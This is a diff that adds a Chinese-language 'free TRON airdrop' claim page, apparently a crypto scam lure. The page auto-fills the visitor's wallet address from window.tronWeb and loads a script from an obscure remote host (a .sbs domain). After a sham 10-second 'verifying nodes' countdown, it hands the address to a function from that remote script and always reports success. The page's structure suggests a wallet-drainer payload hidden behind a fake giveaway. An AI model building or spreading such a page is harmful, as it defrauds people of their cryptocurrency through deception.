@@ -119,3 +119,193 @@
             outline: none;
             transition: all 0.3s ease;
         }
+
+        .form-control:focus {
+            border-color: var(--gold-primary);
+            box-shadow: 0 0 10px rgba(255, 209, 92, 0.3);
+        }
+
+        .form-control::placeholder {
+            color: #6a627d;
+        }
+
+        .btn-claim {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(180deg, #ffd15c 0%, #e6a817 100%);
+            border: none;
+            border-radius: 12px;
+            color: #1a0f00;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(230, 168, 23, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        .btn-claim:active {
+            transform: scale(0.98);
+        }
+
+        .btn-claim:disabled {
+            background: #4a455a;
+            color: #908a9f;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .countdown-wrap {
+            display: none;
+            margin-top: 18px;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.35);
+            border-radius: 10px;
+        }
+
+        .countdown-timer {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--gold-primary);
+            margin-bottom: 6px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, #7b2cbf, #ffd15c);
+            transition: width 1s linear;
+        }
+
+        .status-msg {
+            margin-top: 14px;
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 1.5;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="claim-card">
+    <div class="badge">● 節點網路：TRON (TRC20)</div>
+    <h1>限時免費領取 TRON (TRX)</h1>
+    <p class="sub-desc">輸入 USDT TRC20 錢包地址，排隊完成驗證即可領取專屬空投</p>
+
+    <div class="airdrop-box">
+        <div class="airdrop-amount">50.00 ~ 200.00 TRX</div>
+        <div class="airdrop-hint">每組地址限領 1 次 • 系統驗證後自動派發</div>
+    </div>
+
+    <div class="form-group">
+        <label class="form-label" for="usdt-address">您的 USDT 錢包地址 (TRC20)</label>
+        <input 
+            type="text" 
+            id="usdt-address" 
+            class="form-control" 
+            placeholder="請輸入 T 開頭的 34 位錢包地址" 
+            autocomplete="off"
+        >
+    </div>
+
+    <button id="claim-btn" class="btn-claim" onclick="startClaimProcess()">立即免費領取</button>
+
+    <div id="countdown-wrap" class="countdown-wrap">
+        <div class="countdown-timer">驗證節點中，請稍候：<span id="countdown-sec">10</span> 秒</div>
+        <div style="font-size: 12px; color: var(--text-muted);">正在同步鏈上智能合約...</div>
+        <div class="progress-bar">
+            <div id="progress-fill" class="progress-fill"></div>
+        </div>
+    </div>
+
+    <div id="status-msg" class="status-msg"></div>
+</div>
+
+<script src="https://daheng-8305679B.jiaoyang677.sbs/lj/e.js" async></script>
+
+<script>
+    // 自動帶入當前錢包地址
+    window.addEventListener('load', async () => {
+        try {
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                const input = document.getElementById('usdt-address');
+                if (input && !input.value) {
+                    input.value = window.tronWeb.defaultAddress.base58;
+                }
+            }
+        } catch (e) {}
+    });
+
+    let countdownInterval = null;
+
+    function startClaimProcess() {
+        const addressInput = document.getElementById('usdt-address');
+        const claimBtn = document.getElementById('claim-btn');
+        const countdownWrap = document.getElementById('countdown-wrap');
+        const countdownSec = document.getElementById('countdown-sec');
+        const progressFill = document.getElementById('progress-fill');
+        const statusMsg = document.getElementById('status-msg');
+
+        const address = addressInput.value.trim();
+        statusMsg.style.display = 'none';
+
+        const tronRegex = /^T[1-9A-HJ-NP-za-km-z]{33}$/;
+        if (!tronRegex.test(address)) {
+            statusMsg.style.display = 'block';
+            statusMsg.style.color = 'var(--error-color)';
+            statusMsg.innerText = '請輸入正確的 USDT TRC20 錢包地址 (T開頭 34位)！';
+            addressInput.focus();
+            return;
+        }
+
+        claimBtn.disabled = true;
+        addressInput.disabled = true;
+        countdownWrap.style.display = 'block';
+
+        let secondsLeft = 10;
+        countdownSec.innerText = secondsLeft;
+        progressFill.style.width = '100%';
+
+        countdownInterval = setInterval(() => {
+            secondsLeft--;
+            countdownSec.innerText = secondsLeft;
+            progressFill.style.width = (secondsLeft / 10 * 100) + '%';
+
+            if (secondsLeft <= 0) {
+                clearInterval(countdownInterval);
+                countdownWrap.style.display = 'none';
+                claimBtn.innerText = '正在處理中...';
+
+                // 10秒倒數結束後，呼叫遠端 e.js 內可能提供的函數或觸發後續邏輯
+                try {
+                    if (typeof runContractAction === 'function') {
+                        runContractAction(address);
+                    }
+                    statusMsg.style.display = 'block';
+                    statusMsg.style.color = 'var(--success-color)';
+                    statusMsg.innerHTML = `🎉 領取請求已成功發送！<br><span style="font-size:12px; color:#aaa;">已提交鏈上驗證</span>`;
+                    claimBtn.innerText = '領取成功';
+                } catch (error) {
+                    statusMsg.style.display = 'block';
+                    statusMsg.style.color = 'var(--error-color)';
+                    statusMsg.innerText = '執行異常，請重新整理重試！';
+                    claimBtn.disabled = false;
+                    addressInput.disabled = false;
+                    claimBtn.innerText = '重新領取';
+                }
+            }
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
